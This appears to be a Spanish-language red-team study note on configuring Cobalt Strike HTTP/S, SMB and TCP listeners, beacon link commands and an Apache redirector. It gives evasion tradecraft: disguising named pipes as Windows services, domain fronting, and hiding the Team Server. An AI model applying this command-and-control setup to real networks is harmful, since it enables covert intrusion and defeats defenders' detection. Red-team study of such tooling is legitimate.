---
tags: [c2, cobalt-strike, listeners, http, smb, tcp]
status: done
---

# Listeners

> Configuración de listeners de Cobalt Strike para diferentes escenarios.

---

## HTTP / HTTPS Listener

El más común. El beacon hace callbacks HTTP/S al Team Server (o redirector).

```
Cobalt Strike → Listeners → Add
  Name: HTTP-Prod
  Payload: Cobalt Strike HTTP
  HTTP Hosts: <IP o dominio del redirector>
  HTTP Port: 80 / 443
  HTTP Host Header: (vacío = usar IP, o poner dominio para domain fronting)
```

**OPSEC:**
- Usar HTTPS siempre que sea posible
- Configurar `Host: cdn.legit-service.com` para domain fronting
- El perfil Malleable C2 define cómo se ve el tráfico HTTP (URIs, headers, cookies)

---

## SMB Listener (Peer-to-Peer)

Para movimiento lateral interno. No hace callback al Team Server — se conecta a otro beacon que actúa como proxy.

```
Cobalt Strike → Listeners → Add
  Name: SMB-Internal
  Payload: Cobalt Strike SMB
  Named Pipe: mojo.5688.8052.183894939787088877    ← CAMBIAR este por defecto
```

**OPSEC:**
> ⚠️ El nombre del named pipe por defecto de CS es conocido por los defensores.
> Cambiarlo a algo que parezca legítimo:
> - `wkssvc` (servicio de workstation)
> - `srvsvc` (servicio de servidor)
> - `netlogon`
> 
> Definir en el perfil Malleable C2:
> `set pipename "\\.\pipe\wkssvc";`

**Conexión:**
```
beacon> link <target-hostname> <nombre-pipe>
beacon> link lon-ws-1 wkssvc
```

---

## TCP Listener

Similar a SMB pero via TCP. Útil cuando SMB está bloqueado.

```
Cobalt Strike → Listeners → Add
  Name: TCP-Internal  
  Payload: Cobalt Strike TCP
  Port: 4444   ← Usar puerto no sospechoso en el entorno (ej: 443 internamente)
  Bind to localhost only: ✅ (solo si el beacon hace bind)
```

**Conexión:**
```
beacon> connect <target-hostname> 4444
```

---

## Comparativa de Listeners

| Tipo | Dirección | Uso | OPSEC |
|------|-----------|-----|-------|
| HTTP/S | Beacon → Team Server | Acceso inicial, internet | Medio (tráfico web normal) |
| SMB | Beacon → Beacon (lateral) | Movimiento lateral interno | Alto (no sale a internet) |
| TCP | Beacon → Beacon (lateral) | Alternativa a SMB | Medio |

---

## Redirectores

Nunca exponer el Team Server directamente. Usar un redirector (VPS barato) que reenvíe tráfico:

```bash
# Redirector simple con Apache
# /etc/apache2/sites-enabled/redirect.conf
<VirtualHost *:443>
    SSLEngine on
    ProxyPass / https://<TEAMSERVER_IP>/
    ProxyPassReverse / https://<TEAMSERVER_IP>/
</VirtualHost>
```

**Ventaja:** Si el redirector es quemado/bloqueado, el Team Server sigue intacto.

